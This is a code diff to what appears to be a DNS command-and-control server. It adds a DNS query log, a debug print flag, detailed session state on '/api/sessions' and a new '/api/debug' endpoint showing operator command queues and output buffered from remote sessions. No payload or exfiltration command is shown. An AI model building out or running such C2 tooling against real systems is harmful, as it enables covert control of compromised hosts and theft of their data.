@@ -9,6 +9,7 @@ This server:
 - Maintains a command queue for the operator interface
 """
 
+import collections
 import socket
 import base64
 import threading
@@ -25,6 +26,15 @@ from dnslib.server import DNSServer, BaseResolver
 
 # Logger placeholder - configured in setup_logging() when run as main
 logger = logging.getLogger(__name__)
+
+# Ring buffer of recent DNS queries for diagnostics
+dns_query_log = collections.deque(maxlen=200)
+
+# Server start time for uptime calculation
+server_start_time = time.time()
+
+# Flag for verbose DNS query logging to stdout
+debug_dns_enabled = False
 
 
 def setup_logging():
@@ -187,9 +197,21 @@ class C2Resolver(BaseResolver):
         reply = request.reply()
         qname = str(request.q.qname).rstrip('.')
         qtype = QTYPE[request.q.qtype]
-        
+
         timestamp = datetime.now().strftime('%H:%M:%S')
-        
+
+        # Log every DNS query to the ring buffer for diagnostics
+        src_ip = handler.client_address[0] if hasattr(handler, 'client_address') else 'unknown'
+        dns_query_log.append({
+            'ts': datetime.now().isoformat(),
+            'name': qname,
+            'type': qtype,
+            'src': src_ip,
+        })
+
+        if debug_dns_enabled:
+            print(f"[DNS] {src_ip} -> {qname} ({qtype})")
+
         # Skip logging for AAAA queries and repetitive polls
         # We'll log meaningful events in the handlers instead
         
@@ -544,20 +566,80 @@ class APIHandler(BaseHTTPRequestHandler):
             self.end_headers()
             self.wfile.write(json.dumps({'outputs': outputs}).encode())
         elif self.path.startswith('/api/sessions'):
-            # Return sessions that have polled recently
+            # Return sessions with detailed state
             active_sessions = []
-            
-            # Get sessions that have polled in the last 60 seconds
-            if hasattr(self.server.resolver, '_last_poll_time'):
-                current_time = time.time()
-                for session_id, last_time in self.server.resolver._last_poll_time.items():
-                    if current_time - last_time < 60:  # Active within last minute
-                        active_sessions.append(session_id)
-            
+            resolver = self.server.resolver
+            current_time = time.time()
+
+            # Get all sessions that have ever polled
+            if hasattr(resolver, '_last_poll_time'):
+                for sid, last_time in resolver._last_poll_time.items():
+                    age = current_time - last_time
+                    # Pending commands in the per-session queue
+                    pending = 0
+                    if sid in resolver.client_commands:
+                        pending = resolver.client_commands[sid].qsize()
+                    # Count buffered output chunks
+                    chunk_count = 0
+                    if sid in resolver.output_buffer:
+                        chunk_count = len(resolver.output_buffer[sid])
+                    active_sessions.append({
+                        'id': sid,
+                        'last_seen': last_time,
+                        'last_seen_ago': round(age, 1),
+                        'pending_commands': pending,
+                        'has_pending_delivery': sid in resolver.pending_commands,
+                        'output_chunks': chunk_count,
+                        'terminated': sid in resolver.terminated_sessions,
+                    })
+
             self.send_response(200)
             self.send_header('Content-Type', 'application/json')
             self.end_headers()
             self.wfile.write(json.dumps({'sessions': active_sessions}).encode())
+
+        elif self.path.startswith('/api/debug'):
+            # Full debug dump for diagnostics
+            resolver = self.server.resolver
+            current_time = time.time()
+
+            # Active sessions summary
+            sessions_debug = {}
+            if hasattr(resolver, '_last_poll_time'):
+                for sid, last_time in resolver._last_poll_time.items():
+                    pending = 0
+                    if sid in resolver.client_commands:
+                        pending = resolver.client_commands[sid].qsize()
+                    chunk_count = 0
+                    if sid in resolver.output_buffer:
+                        chunk_count = len(resolver.output_buffer[sid])
+                    sessions_debug[sid] = {
+                        'last_seen': last_time,
+                        'last_seen_ago': round(current_time - last_time, 1),
+                        'pending_commands': pending,
+                        'has_pending_delivery': sid in resolver.pending_commands,
+                        'output_chunks': chunk_count,
+                        'terminated': sid in resolver.terminated_sessions,
+                        'poll_count': getattr(resolver, '_poll_counts', {}).get(sid, 0),
+                    }
+
+            # Recent DNS queries (last 50 from the ring buffer)
+            recent_queries = list(dns_query_log)[-50:]
+
+            debug_info = {
+                'server_uptime': round(current_time - server_start_time, 1),
+                'active_sessions': sessions_debug,
+                'output_buffer': {
+                    sid: len(chunks) for sid, chunks in resolver.output_buffer.items()
+                },
+                'recent_dns_queries': recent_queries,
+                'total_dns_queries_in_buffer': len(dns_query_log),
+            }
+
+            self.send_response(200)
+            self.send_header('Content-Type', 'application/json')
+            self.end_headers()
+            self.wfile.write(json.dumps(debug_info, default=str).encode())
         else:
             self.send_response(404)
             self.end_headers()
@@ -697,8 +779,15 @@ def main():
                         help='HTTP API port (default: 8080)')
     parser.add_argument('--address', default='0.0.0.0',
                         help='Address to bind to (default: 0.0.0.0)')
+    parser.add_argument('--debug-dns', action='store_true',
+                        help='Print every DNS query to stdout in real-time')
     args = parser.parse_args()
-    
+
+    global debug_dns_enabled
+    debug_dns_enabled = args.debug_dns
+    if debug_dns_enabled:
+        logger.info("Debug DNS mode enabled: all queries will be printed to stdout")
+
     server = DNSServerWithAPI(args.domain, args.dns_port, args.api_port, args.address)
     server.start()
     
